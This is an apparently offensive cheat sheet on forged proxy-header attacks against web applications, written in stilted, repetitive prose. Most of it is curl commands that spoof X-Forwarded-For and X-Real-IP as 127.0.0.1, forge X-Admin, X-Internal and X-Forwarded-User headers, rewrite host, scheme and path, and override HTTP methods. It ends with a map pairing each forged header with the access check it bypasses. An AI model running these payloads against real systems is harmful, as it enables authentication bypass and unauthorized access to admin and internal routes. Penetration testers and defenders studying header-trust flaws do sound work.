# Client-supplied — the forged-proxy-header attack, exhaustively

The client-supplied proxy header — a forged header the app trusts.

---

## 1. The model — a client-supplied proxy header

```text
a client-supplied proxy header — the app trusts it — the app doesn't
verify the proxy added it — a client-supplied header IS trusted — a
forged local IP → a local request → the trust check bypassed.
```

## 2. The spoofed-IP — a forged local IP

```bash
# a client-supplied proxy header — a forged local IP
curl "$BASE/api/admin" -H 'X-Real-IP: 127.0.0.1'   # a 200 — the app trusts the header
curl "$BASE/api/admin" -H 'X-Forwarded-For: 127.0.0.1'   # a 200 — the app trusts the header
curl "$BASE/api/admin" -H 'X-Client-IP: 127.0.0.1'   # a 200 — the app trusts the header
```

```text
a forged local IP → the app's local-vs-remote check reads the forged
IP → a local request → the trust check bypassed.
```

## 3. The spoofed-flag — a forged internal/admin flag

```bash
# a forged flag — an internal-route check bypass
curl "$BASE/internal" -H 'X-Internal: true'   # an internal-route check bypass
curl "$BASE/admin" -H 'X-Admin: true'   # an admin check bypass
curl "$BASE/api/debug" -H 'X-Debug: true'   # a debug check bypass
```

## 4. The spoofed-user — a forged user

```bash
# a forged user — a user check bypass
curl "$BASE/api/user" -H 'X-Forwarded-User: admin'   # a forged admin user
curl "$BASE/api/user" -H 'X-Forwarded-Email: admin@target.com'   # a forged email
```

## 5. The spoofed-host — a rewritten host

```bash
# a forged host — a URL-rewrite
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # the app's links point to attacker.com
curl "$BASE/page" -H 'X-Host: attacker.com'   # a forged X-Host
```

## 6. The spoofed-scheme — a scheme downgrade

```bash
# a forged scheme — a scheme confusion
curl "$BASE/page" -H 'X-Forwarded-Scheme: http'   # the app's links use http
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # a forged proto
```

## 7. The spoofed-path — a rewritten path

```bash
# a forged path — a path-rewrite
curl "$BASE/page" -H 'X-Original-URL: /admin'   # the app serves /admin under /page
curl "$BASE/page" -H 'X-Rewrite-URL: /admin'   # a forged rewrite-URL
```

## 8. The spoofed-method — a forged method

```bash
# a forged method — a method-override
curl "$BASE/api" -H 'X-HTTP-Method-Override: DELETE' -d 'data'   # a DELETE-as-POST
curl "$BASE/api" -H 'X-Original-Method: PUT' -d 'data'   # a PUT-as-POST
```

## 9. The client-supplied's check — the forged-header probe

```bash
# the client-supplied check — does the app trust a client-supplied header
curl "$BASE/api/restricted" -H 'X-Real-IP: 127.0.0.1'   # a client-supplied X-Real-IP
#   a 200 → the app trusts the client-supplied header → the check's input
```

## 10. The client-supplied's falsifier — a proxy that strips a client header

```text
a proxy that strips a client-supplied proxy header → the client-
supplied header doesn't reach the app → the client-supplied bypass
fails → the hop-by-hop bypass is the remaining vector.
```

## 11. The client-supplied's falsifier — a proxy that verifies

```text
a proxy that verifies the header it added → a client-supplied header
is rejected → the client-supplied bypass fails → the hop-by-hop
bypass is the remaining vector.
```

## 12. The client-supplied's falsifier — a non-header check

```text
a trust check that reads a different input (a session, a token, a
signature) → the header isn't the check's input → a different class.
```

## 13. The client-supplied's per-vector map — which header for which check

```text
a local-vs-remote check     → X-Real-IP: 127.0.0.1 / X-Forwarded-For: 127.0.0.1
an internal-route check     → X-Internal: true
an admin check              → X-Admin: true
a user check                → X-Forwarded-User: admin
a host check                → X-Forwarded-Host: attacker.com
a scheme check              → X-Forwarded-Scheme: http
a path check                → X-Original-URL: /admin
a method check              → X-HTTP-Method-Override: DELETE
```

## 14. The client-supplied's reach — the gated route

```text
the client-supplied bypass reaches a route the proxy's header gates —
an authenticated-only route, an internal route, a restricted endpoint —
the app's trust check reads the client-supplied header's effect.
```
